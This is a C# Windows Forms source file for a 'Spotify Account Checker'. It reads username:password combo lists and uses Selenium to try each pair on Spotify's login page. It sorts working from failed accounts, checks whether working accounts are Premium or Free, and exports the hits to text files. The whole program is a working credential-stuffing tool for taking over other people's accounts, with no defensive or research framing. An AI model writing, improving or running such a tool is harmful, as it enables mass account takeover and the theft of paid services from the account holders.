using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System.Runtime.InteropServices;
using System.Threading;
using OpenQA.Selenium.Remote;

namespace Spotify_Account_Checker
{
    public partial class Form1 : Form
    {
        //selenium webdriver
      
        IWebDriver driver = new ChromeDriver();
      
        public Form1()
        {
            InitializeComponent();

        }

     


        private void button1_Click(object sender, EventArgs e)
        {
            //Import combo list into listbox
            try
            {
                OpenFileDialog f = new OpenFileDialog();
                if (f.ShowDialog() == DialogResult.OK)
                {
                    listBox1.Items.Clear();
                    List<string> lines = new List<string>();
                    using (StreamReader r = new StreamReader(f.OpenFile()))
                    {
                        string line;
                        while ((line = r.ReadLine()) != null)
                        {
                            listBox1.Items.Add(line);
                        }
                    }

                }

                //change label text to reflect maximum combo items.
                int i = listBox1.Items.Count;
                int progress = 0;
                label2.Text = "0" + "/" + i;
                progressBar1.Maximum = i;
                Console.WriteLine("Successfully Imported the list!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred when importing the list. '{0}'", ex);
            }
           
        }

        public async Task login(string user, string password)
        {
            
            Console.WriteLine("Loading Spotify Login Page");
            //clear cookies aka logout
            driver.Manage().Cookies.DeleteAllCookies();
            //navigate to spotify login page
            driver.Navigate().GoToUrl("https://accounts.spotify.com/en/login");
            Console.WriteLine("Waiting for page load...");
            //wait for page to load.
            driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
            Console.WriteLine("Page successfully loaded!");
            Console.WriteLine("Begin check");
            //write to console currently checked.
            Console.WriteLine("Sending " + user + " to browser");
            //selenium - find username textbox.
            driver.FindElement(By.Id("login-username")).Clear();
            //send keys to username textbox
            driver.FindElement(By.Id("login-username")).SendKeys(user);
            //wait 200 miliseconds.
            Thread.Sleep(200);
            //write to console currently checked.
            Console.WriteLine("Sending " + password + " to browser");
            //selenium find password box.
            driver.FindElement(By.Id("login-password")).Clear();
            //send password to textbox.
            driver.FindElement(By.Id("login-password")).SendKeys(password);
            //wait 200 miliseconds
            Thread.Sleep(200);
            //submit login.
            Console.WriteLine("Submitting Login...");
            //send enter key.
            driver.FindElement(By.Id("login-password")).SendKeys(OpenQA.Selenium.Keys.Enter);
            //wait 1 second.
            Thread.Sleep(1000);
            Console.WriteLine("Waiting for page load...");
            //wait for page load.
            driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
            Console.WriteLine("Page loaded, checking if successfull");
            


        }

       
        public async Task<bool?> check_()
            //check login function
        {

                      
                IWebElement body = driver.FindElement(By.TagName("body"));
                //if page login incorrect, return false.
                if (body.Text.Contains("Incorrect"))
                {
                    return false;
                }
                //if successfull return true.
                else if (body.Text.Contains("logged"))
                {
                    return true;
                }
                //if unknown return null
                else
                {
                    return null;

                }
            
           
        }

        //check premium status
        public async Task<bool?> isPremium()
        {
            driver.Navigate().GoToUrl("https://accounts.spotify.com/en-US/login?continue=https:%2F%2Fwww.spotify.com%2Fau%2Faccount%2Foverview%2F");
            driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
            IWebElement product = driver.FindElement(By.ClassName("product-name"));
            if (product.Text.Contains("Free"))
            {
                return false;
            }
            else if (product.Text.Contains("Premium"))
            {
                return true;
            }
            else
            {
                return null;
            }

        }

    


        private async void button2_Click(object sender, EventArgs e)
        {
            button2.Enabled = false;
            checkBox1.Enabled = false;
            //set progressbar maximum.
            int i = listBox1.Items.Count;
            int progress = 0;
            label2.Text = "0" + "/" + i;
            progressBar1.Maximum = i;
            int retries = 0;
            //iterate over each combo in listbox1
            foreach (string item in listBox1.Items)
            {
            code_start:
              
                //split combo by :
                string[] user = item.Split(new String[] { ":" }, StringSplitOptions.None);
                //username
                label5.Text = user[0];
                //password
                label6.Text = user[1];
               

                //run login task, passing username and password to function.
                Task task = Task.Run(() => login(user[0], user[1]));
                await task;


                //run check task.
                Task<bool?> check = Task<bool?>.Run(() => check_());
                //set variable to the returned boolean of the check function.
                bool? working = await check;

                
              

                //if working add to working list.
                if (working == true)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine(user[0] + " " + user[1] + " is a working account");
                    Console.ResetColor();
                    listBox2.Items.Add(item);
                }
                //if not working add to not working list.
                else if (working == false)
                {
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine(user[0] + " " + user[1] + "is not working");
                    Console.ResetColor();
                    listBox3.Items.Add(item);

                }
                //if cannot determine retry 4 times.
                else if (working == null)
                {

                    while (retries < 5)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Cannot Determine, Rechecking... (" + retries + ")");
                        Console.ResetColor();
                        retries = retries + 1;
                        goto code_start;

                    }
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Maximum retries reached. Assumming account is not valid.");
                    Console.ResetColor();
                    listBox3.Items.Add(item);


                }

                if (checkBox1.Checked == true && working == true)
                {
                    int retries_ = 0;
                    check_start:
                    Console.WriteLine("Checking premium status...");
                    Task<bool?> check_Status = Task<bool?>.Run(() => isPremium());
                    bool? premium = await check_Status;
                    if (premium == true)
                    {
                        Console.WriteLine(item + " is a premium account");
                        listView1.Items.Add(item).SubItems.Add("Premium");


                    }
                    else if (premium == false)
                    {
                        Console.WriteLine(item + " is a free account");
                        listView1.Items.Add(item).SubItems.Add("Free");
                    }
                    else if (premium == null)
                    {
                        while (retries < 5)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("Cannot determine status. Rechecking. " + "(" + retries_ + ")");
                            Console.ResetColor();
                            retries_ = retries_ + 1;
                            goto check_start;
                        }
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Maximum retries reached. Assumming account is not free.");
                        Console.ResetColor();
                        Console.WriteLine(item + " is a free account");
                        listView1.Items.Add(item).SubItems.Add("Free");

                    }
                }

                //set group box text and others.
                progress = progress + 1;
                progressBar1.Value = progress;
                label2.Text = progress + "/" + i;
                groupBox2.Text = "Working " + "(" + listBox2.Items.Count + ")";
                groupBox3.Text = " Not Working " + "(" + listBox3.Items.Count + ")";

            }
            
            //completed check.
            MessageBox.Show("Check Completed. Have found " + listBox2.Items.Count + " working accounts and " + listBox3.Items.Count + " invalid accounts");
            progressBar1.Value = 0;
            label2.Text = "0" + "/" + i;
            button2.Enabled = true;
            checkBox1.Enabled = true;

        }



        //CONSOLE WINDOW
        public static void ShowConsoleWindow()
        {
            var handle = GetConsoleWindow();

            if (handle == IntPtr.Zero)
            {
                AllocConsole();
            }
            else
            {
                ShowWindow(handle, SW_SHOW);
            }
        }

        public static void HideConsoleWindow()
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        //END CONSOLE WINDOW

        private void Form1_Load(object sender, EventArgs e)
        {
            //show console window
            ShowConsoleWindow();
            //log loaded successfully
            Console.WriteLine("Application Successfully Loaded!");
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //quit driver
            driver.Quit();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            //save working accounts to text file.
            var saveFile = new SaveFileDialog();
            saveFile.Filter = "Text (*.txt)|*.txt";
            if (saveFile.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                using (var sw = new StreamWriter(saveFile.FileName, false))
                    foreach (var item in listBox2.Items)
                        sw.Write(item.ToString() + Environment.NewLine);
                
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            //clear listbox
            listBox1.Items.Clear();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {

            var saveFile = new SaveFileDialog();
            saveFile.Filter = "Text (*.txt)|*.txt";
            if (saveFile.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                using (StreamWriter sw = new StreamWriter(saveFile.FileName, false))
                {
                    foreach (ListViewItem item in listView1.Items)
                    {
                        
                        for (int i = 1; i < item.SubItems.Count; i++)
                            if (item.SubItems[i].Text == "Premium")
                            {
                                sw.Write(item.Text);
                                sw.Write(Environment.NewLine);

                            }
                            
                        
                    }
                }
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            var saveFile = new SaveFileDialog();
            saveFile.Filter = "Text (*.txt)|*.txt";
            if (saveFile.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                using (StreamWriter sw = new StreamWriter(saveFile.FileName, false))
                {
                    foreach (ListViewItem item in listView1.Items)
                    {
                        
                        for (int i = 1; i < item.SubItems.Count; i++)
                            if (item.SubItems[i].Text == "Free")
                            {
                                sw.Write(item.Text);
                                sw.Write(Environment.NewLine);
                            }

                        
                    }
                }
            }
        }
    }
    }

    

